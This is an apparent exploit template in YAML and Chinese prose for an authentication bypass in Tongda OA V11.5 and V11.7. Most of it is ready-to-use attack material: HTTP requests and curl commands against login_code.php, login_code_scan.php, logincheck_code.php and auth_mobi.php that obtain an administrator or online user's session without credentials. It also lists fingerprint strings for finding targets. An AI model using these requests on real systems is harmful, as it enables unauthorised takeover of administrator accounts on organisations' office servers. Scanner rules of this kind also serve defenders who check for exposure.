---
id: TONGDA-LOGIN-BYPASS
title: 通达OA 多版本认证绕过任意用户登录
product: tongda-oa
vendor: 北京通达信科
version_affected: "V11.5, V11.7"
severity: CRITICAL
tags: [auth_bypass, 无需认证, 国产, oa]
fingerprint: ["通达OA", "Office Anywhere", "login_code.php", "auth_mobi.php"]
---

## 漏洞描述

通达OA 多个版本存在认证绕过漏洞，攻击者可利用 login_code.php、logincheck_code.php 或 auth_mobi.php 接口获取管理员 session。

## 影响版本

- V11.5（login_code + logincheck_code）
- V11.7（auth_mobi）

## 前置条件

- 无需认证
- 目标为通达OA V11.5 或 V11.7，相关登录接口可访问

## 利用步骤

### v11.5 login_code.php 任意用户登录

```http
GET /ispirit/login_code.php HTTP/1.1
Host: target
```

返回 `codeuid={UID}` 后：

```http
POST /general/login_code_scan.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

codeuid={UID}&uid=1&source=pc&type=confirm&username=admin
```

uid=1 为 admin 用户，返回有效 session。

### v11.5 logincheck_code.php 登录绕过

```http
POST /logincheck_code.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

CODEUID={UID}&UID=1
```

配合 login_code.php 获取的 CODEUID 使用。

### v11.7 auth_mobi.php 在线用户登录

```http
GET /mobile/auth_mobi.php?is498498=1&authenticatekey=test HTTP/1.1
Host: target
```

获取在线用户 SESSID 后直接使用该 session 访问后台。

## Payload

### v11.5 获取 codeuid

```bash
curl -s "http://target/ispirit/login_code.php"
```

### v11.5 利用 codeuid 登录

```bash
curl -s -X POST "http://target/general/login_code_scan.php" \
  -d "codeuid={UID}&uid=1&source=pc&type=confirm&username=admin"
```

### v11.7 auth_mobi 获取 session

```bash
curl -s "http://target/mobile/auth_mobi.php?is498498=1&authenticatekey=test"
```

## 验证方法

获取到有效 session 后可访问后台页面。
